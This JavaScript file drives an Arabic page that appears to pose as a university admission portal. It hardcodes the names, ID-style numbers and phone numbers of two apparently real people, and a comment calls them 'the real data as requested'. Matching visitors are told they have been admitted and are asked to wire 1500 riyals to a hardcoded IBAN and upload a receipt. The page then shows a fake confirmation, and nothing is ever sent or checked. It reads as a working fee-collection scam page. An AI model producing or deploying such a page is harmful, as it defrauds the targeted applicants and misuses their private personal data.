// Sample student data
const studentData = {
    "1145181531": {
        name: "أحمد منير توفيق الأيوبي",
        degree: "بكالوريوس",
        major: "فيزياء",
        status: "مقبول",
        admissionDate: "2025/07/04",
        phone: "0566962545",
        fees: {
            tuition: 1500,
            registration: 0,
            books: 0,
            total: 1500
        }
    },

    // الطالبة أملاك — البيانات الحقيقية كما طلبت
    "1121094377": {
        name: "أملاك فواز مالك",
        degree: "بكالوريوس",
        major: "قانون تجاري",
        status: "مقبولة",
        admissionDate: "2025/09/01",
        phone: "0501733515",
        fees: {
            tuition: 1500,
            registration: 0,
            books: 0,
            total: 1500
        }
    }
};

let currentStudent = null;

// Hide all forms
function hideAllForms() {
    document.getElementById("forms-section").classList.add("hidden");
    document.getElementById("results-section").classList.add("hidden");
    document.getElementById("inquiry-form").classList.add("hidden");
}

// Scroll function
function scrollToElement(id) {
    document.getElementById(id).scrollIntoView({ behavior: "smooth", block: "start" });
}

// Show inquiry form
function showInquiryForm() {
    hideAllForms();
    document.getElementById("forms-section").classList.remove("hidden");
    document.getElementById("inquiry-form").classList.remove("hidden");
    document.getElementById("inquiry-id").value = "";
    document.getElementById("inquiry-phone").value = "";
    scrollToElement("forms-section");
}

// Check admission
function checkAdmission() {
    const id = document.getElementById("inquiry-id").value;
    const phone = document.getElementById("inquiry-phone").value;

    if (!id || !phone) {
        alert("الرجاء إدخال رقم الهوية ورقم الجوال.");
        return;
    }

    if (studentData[id] && studentData[id].phone === phone) {
        currentStudent = studentData[id];
        showAdmissionResult();
    } else {
        alert("عذراً، لا توجد بيانات مطابقة.");
    }
}

// Show admission result
function showAdmissionResult() {
    hideAllForms();
    const r = document.getElementById("results-section");

    r.innerHTML = `
        <div class="result-card">
            <div class="result-header">
                <h3>تم قبولك بنجاح!</h3>
                <p class="status-accepted">مبروك! تم قبولك</p>
            </div>

            <div class="student-info">
                <div class="info-item"><label>الاسم:</label><span>${currentStudent.name}</span></div>
                <div class="info-item"><label>الدرجة العلمية:</label><span>${currentStudent.degree}</span></div>
                <div class="info-item"><label>التخصص:</label><span>${currentStudent.major}</span></div>
                <div class="info-item"><label>حالة القبول:</label><span>${currentStudent.status}</span></div>
                <div class="info-item"><label>تاريخ القبول:</label><span>${currentStudent.admissionDate}</span></div>
            </div>

            <button class="submit-btn" onclick="showConfirmationSuccess()">تأكيد القبول</button>
        </div>
    `;

    r.classList.remove("hidden");
    scrollToElement("results-section");
}

// Show confirmation step
function showConfirmationSuccess() {
    hideAllForms();
    const r = document.getElementById("results-section");

    r.innerHTML = `
        <div class="result-card">
            <div class="result-header">
                <h3>تم تأكيد قبولك!</h3>
                <p class="status-accepted">تم تأكيد القبول بنجاح</p>
            </div>

            <div class="student-info">
                <div class="info-item"><label>الاسم:</label><span>${currentStudent.name}</span></div>
                <div class="info-item"><label>الدرجة العلمية:</label><span>${currentStudent.degree}</span></div>
                <div class="info-item"><label>التخصص:</label><span>${currentStudent.major}</span></div>
            </div>

            <button class="submit-btn" onclick="showPaymentInvoice()">السداد</button>
        </div>
    `;

    r.classList.remove("hidden");
    scrollToElement("results-section");
}

// Show payment invoice
function showPaymentInvoice() {
    hideAllForms();
    const r = document.getElementById("results-section");

    r.innerHTML = `
        <div class="result-card">
            <div class="result-header">
                <h3>فاتورة السداد</h3>
                <p>الرجاء سداد الرسوم لإتمام التسجيل</p>
            </div>

            <div class="student-info">
                <div class="info-item"><label>الطالب:</label><span>${currentStudent.name}</span></div>
                <div class="info-item"><label>التخصص:</label><span>${currentStudent.major}</span></div>
            </div>

            <div class="payment-invoice">
                <div class="invoice-header"><h4>تفاصيل الرسوم</h4></div>

                <div class="invoice-details">
                    <div class="invoice-item"><span>الرسوم الدراسية:</span><span>${currentStudent.fees.tuition} ريال</span></div>
                    <div class="invoice-item"><span>رسوم التسجيل:</span><span>${currentStudent.fees.registration} ريال</span></div>
                    <div class="invoice-item"><span>رسوم الكتب:</span><span>${currentStudent.fees.books} ريال</span></div>
                </div>

                <div class="invoice-total">
                    <p>المجموع الكلي</p>
                    <p class="total-amount">${currentStudent.fees.total} ريال سعودي</p>
                </div>
            </div>

            <div class="bank-info">
                <h5>معلومات التحويل البنكي</h5>
                <div class="bank-details">
                    <div class="bank-item">
                        <span>الآيبان:</span>
                        <span>SA8280000859608014826386</span>
                    </div>
                </div>
            </div>

            <div class="upload-section">
                <h5>رفع إيصال السداد</h5>
                <div class="upload-area" onclick="document.getElementById('receipt-upload').click()">
                    <input type="file" id="receipt-upload" accept=".pdf,.jpg,.png">
                    <div class="upload-icon">📄</div>
                    <p>اضغط هنا لرفع الإيصال</p>
                </div>

                <button class="submit-btn mt-20" onclick="submitPayment()">إرسال إيصال السداد</button>
            </div>
        </div>
    `;

    r.classList.remove("hidden");
    scrollToElement("results-section");
}

// Submit payment
function submitPayment() {
    const file = document.getElementById("receipt-upload").files[0];

    if (!file) {
        alert("يرجى رفع الإيصال أولاً");
        return;
    }

    setTimeout(() => showPaymentSuccess(), 1500);
}

// Payment success
function showPaymentSuccess() {
    hideAllForms();

    const ref = "REF-" + Date.now();
    const r = document.getElementById("results-section");

    r.innerHTML = `
        <div class="result-card">
            <div class="result-header">
                <h3>تم إرسال إيصال السداد بنجاح!</h3>
                <p class="status-accepted">سيتم مراجعة الإيصال خلال 24 ساعة</p>
            </div>

            <div style="background: rgba(40,167,69,0.1); padding:20px; border-radius:15px; text-align:center;">
                <h4 style="color:#28a745;">تم استلام الإيصال</h4>
                <p>رقم المرجع: ${ref}</p>
                <p style="font-size:14px;">يرجى الاحتفاظ برقم المرجع</p>
            </div>

            <div class="student-info">
                <div class="info-item"><label>الاسم:</label><span>${currentStudent.name}</span></div>
                <div class="info-item"><label>المبلغ:</label><span>${currentStudent.fees.total} ريال سعودي</span></div>
                <div class="info-item"><label>تاريخ الإرسال:</label><span>${new Date().toLocaleDateString("ar-SA")}</span></div>
            </div>

            <div class="text-center mt-20">
                <button class="submit-btn" onclick="goHome()" style="padding:15px 40px;">العودة للرئيسية</button>
            </div>
        </div>
    `;

    r.classList.remove("hidden");
    scrollToElement("results-section");
}

// Return home
function goHome() {
    location.reload();
}
